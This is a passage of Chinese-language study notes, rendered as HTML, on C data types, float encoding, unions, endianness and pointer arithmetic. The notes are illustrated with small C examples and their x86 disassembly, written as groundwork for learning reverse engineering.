title="整数类型"></a>整数类型</h3><table><thead><tr><th>整数类型</th><th>bit</th><th>字节</th><th>宽度</th></tr></thead><tbody><tr><td>char</td><td>8bit</td><td>1字节</td><td>byte</td></tr><tr><td>short</td><td>16bit</td><td>2字节</td><td>word</td></tr><tr><td>int</td><td>32bit</td><td>4字节</td><td>dword</td></tr><tr><td>long</td><td>32bit</td><td>4字节</td><td>dword</td></tr></tbody></table><p>unsigned无符号数</p><p>有符号数和无符号数在内存中是完全一样的，只是看你想怎么用它。</p><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></p><ol><li>先将这个浮点数的绝对值值化为二进制</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入0，否则放入1。</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0。</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p><strong>double是64位的，8个字节（float是4个字节）</strong></p><br><p>首先把浮点数转换为二进制</p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>0</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p> 如果是-8.25，也只需要变符号位</p><table><thead><tr><th>31符号位</th><th>23~30指数部分</th><th>0~22位数部分</th></tr></thead><tbody><tr><td>1</td><td>10000010</td><td>00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>标准aciss码由1个字节组成，最高位为0。</p><p>gb2312由2个字节组成，最高位为1。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>从逆向的角度来说</p><p>执行最快的是do while循环，其次是while循环，效率最差的是for循环。</p><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">fun</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fun a;</span><br><span class="line">    a.y = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);<span class="comment">//78</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>特点：</p><ol><li>联合体的成员是共享内存空间的</li><li>联合体的内存空间大小是联合体成员中对内存空间要求最大的空间大小</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;fun;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fun.y = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,fun.x);<span class="comment">//78</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个是定义了类型名。一个是匿名联合体，同时创建变量。（结构体也可以这样用）</p><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>typedef作用是为一种数据类型定义一个新名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> WORD;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> DWORD;</span><br></pre></td></tr></table></figure><p>对数组的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> vector[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector v;<span class="comment">//相当于int v[10]</span></span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> arr[<span class="number">10</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">arr[<span class="number">4</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">5</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//or 0 or null</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,arr);</span><br></pre></td></tr></table></figure><p>如果没有<code>\0</code>结果会出现垃圾数据，可以通过gb2312编码输出中文。</p><h2 id="寄存器与内存的区别"><a href="#寄存器与内存的区别" class="headerlink" title="寄存器与内存的区别"></a>寄存器与内存的区别</h2><ol><li>寄存器位于CPU内部，执行速度快，但比较贵</li><li>内存速度相对较慢，但成本低，可以做的很大</li><li>寄存器和内存没有本质上的区别，都是用于存储数据的容器，都是定宽的</li></ol><p>32位的计算机和64位的计算机区别在于寻址能力而不是CPU。</p><p>32位的计算机有32根总线，我们可以理解为32位Bit，一个32位计算机内存寻址的最大范围是<code>0xFFFFFFFF+1</code>（加一是因为包括0）。0xFFFFFFFF+1字节可以转换成4g。所以32位计算机最大只能有4g内存，在大无法识别。并且因为本身自带的硬件占用一些，远远不到4g。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word DS:ptr[0x12345678], 0xFFFF</span><br></pre></td></tr></table></figure><p>ptr的意思后面是一个指针（指针里面存储了一个地址），word的意思是要读写多少，可以改成<code>byte</code>，<code>word</code>和<code>dword</code></p><p><strong>每个内存单元能存储一个字节。每个字节有个编号，称为内存地址。</strong></p><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>我们首先使用指令：<code>mov dword ptr [0x19FF74],0x23456789</code></p><p>然后会发现数据窗口是这么存储23456789的</p><p><img src="https://i.loli.net/2020/08/20/7Cz2UQ1V3MsGuNF.png" alt="image-20200820124756561.png"></p><p>这是因为字节的存储顺序是小端序，<strong>数据的高位字节存放在内存的高地址</strong></p><p>大端序则是高字节存放在内存的低地址。</p><h1 id="0x06-指针"><a href="#0x06-指针" class="headerlink" title="0x06 指针"></a>0x06 指针</h1><h2 id="带-类型的宽度"><a href="#带-类型的宽度" class="headerlink" title="带*类型的宽度"></a>带*类型的宽度</h2><p><strong>任何数据类型加上*（不管是一个*还是多个*）都会变成新的类型，宽度为4字节(32位系统)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SS</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* x;</span><br><span class="line">    <span class="keyword">short</span>**** y;</span><br><span class="line">    <span class="keyword">int</span>* z;</span><br><span class="line">    SS* b;</span><br><span class="line">    x = (<span class="keyword">char</span>*)<span class="number">1</span>;</span><br><span class="line">    y = (<span class="keyword">short</span>****)<span class="number">2</span>;</span><br><span class="line">    z = (<span class="keyword">int</span>*)<span class="number">3</span>;</span><br><span class="line">    b = (SS*)<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="带-类型的-–"><a href="#带-类型的-–" class="headerlink" title="带*类型的++ –"></a>带*类型的++ –</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//101 102 104</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉一个星号之后的宽度决定加几减几。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>*** b;</span><br><span class="line">    <span class="keyword">int</span>**** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>***)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>****)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//32位系统104 104 104</span></span><br><span class="line">    <span class="comment">//64位系统108 108 108</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char**去掉一个*宽度为4，short ***去掉一个*宽度也为4。</p><h2 id="带-类型的加减法"><a href="#带-类型的加减法" class="headerlink" title="带*类型的加减法"></a>带*类型的加减法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//105 110 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面一样，先去掉*看字节宽度，然后char+5就是5×1。short就是5×2。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>** b;</span><br><span class="line">    <span class="keyword">int</span>** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>**)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>**)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//120 120 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理</p><p><strong>总结</strong></p><ul><li>带*类型的变量可以加、减一个整数，但是不能乘除。(编译器不允许)</li><li>带*类型变量与其他整数相加或相减的时候：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度)</span><br><span class="line">带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度)</span><br></pre></td></tr></table></figure><h2 id="两个带-的类型相减"><a href="#两个带-的类型相减" class="headerlink" title="两个带*的类型相减"></a>两个带*的类型相减</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* a;</span><br><span class="line"><span class="keyword">char</span>* b;</span><br><span class="line">a = (<span class="keyword">char</span>*)<span class="number">200</span>;</span><br><span class="line">b = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = a-b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//100</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> x = a-b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//25((200-100)/4)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>两个类型相同的带*类型的变量可以进行减法操作</li><li>想减的结果要除以去掉一个*的数据的宽度</li><li><strong>两个带*类型相减完的结果是int</strong></li></ol><h2 id="两个带-的类型作比较"><a href="#两个带-的类型作比较" class="headerlink" title="两个带*的类型作比较"></a>两个带*的类型作比较</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>带*的变量，如果类型相同，可以做大小的比较。</p><br><h1 id="0x07-指针-2"><a href="#0x07-指针-2" class="headerlink" title="0x07 指针 2"></a>0x07 指针 2</h1><h2 id="取地址符-amp"><a href="#取地址符-amp" class="headerlink" title="取地址符&amp;"></a>取地址符&amp;</h2><ul><li>&amp;可以取任何<strong>变量</strong>的地址</li><li>&amp;a的类型就是a的类型加上*</li><li>带*的类型用来存储地址</li></ul><p>局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>**** a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:        char**** a;</span><br><span class="line">2:        short b;</span><br><span class="line">3:        int* c;</span><br><span class="line">4:       char***** aa= &amp;a;</span><br><span class="line">00401028   lea         eax,[ebp-4]</span><br><span class="line">0040102B   mov         dword ptr [ebp-10h],eax</span><br><span class="line">5:       short* bb = &amp;b;</span><br><span class="line">0040102E   lea         ecx,[ebp-8]</span><br><span class="line">00401031   mov         dword ptr [ebp-14h],ecx</span><br><span class="line">6:       int** cc = &amp;c;</span><br><span class="line">00401034   lea         edx,[ebp-0Ch]</span><br><span class="line">00401037   mov         dword ptr [ebp-18h],edx</span><br></pre></td></tr></table></figure><p>全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>**** a;</span><br><span class="line"><span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">int</span>* c;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9:        char***** aa= &amp;a;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],offset a (00427e3c)</span><br><span class="line">10:       short* bb = &amp;b;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],offset b (00427e38)</span><br><span class="line">11:       int** cc = &amp;c;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],offset c (00427e34)</span><br></pre></td></tr></table></figure><p>offset a的意思是指a的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [00427e3c]</span><br><span class="line">mov dword ptr [ebp-4],eax</span><br><span class="line">; 意思一样</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="*"></a>*</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* x;</span><br><span class="line"><span class="comment">//*x == int</span></span><br><span class="line"><span class="keyword">char</span>** y;</span><br><span class="line"><span class="comment">//*y == char*</span></span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span>* b = &amp;a;</span><br><span class="line"><span class="keyword">int</span> c = *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],16h</span><br><span class="line">0040102F   lea         eax,[ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401035   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">00401038   mov         edx,dword ptr [ecx]</span><br><span class="line">0040103A   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><p>编译器没有直接把地址存到ecx里，而是用ecx和edx进行过渡。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//int* x = &amp;arr[0]可以简写成int* x = arr</span></span><br><span class="line">    <span class="keyword">int</span>* x = arr;</span><br><span class="line">    x+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//x+1==地址+1×4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><em>int</em> x = &amp;arr[0]可以简写成int</em> x = arr**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* a;</span><br><span class="line">    <span class="comment">//*(a+0) == a[0];</span></span><br><span class="line"><span class="comment">//*(a+2) == a[2];</span></span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    <span class="comment">//*(*(b+0)+0) == b[0][0];</span></span><br><span class="line">    <span class="comment">//*(*(b+2)+3) == b[2][3];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 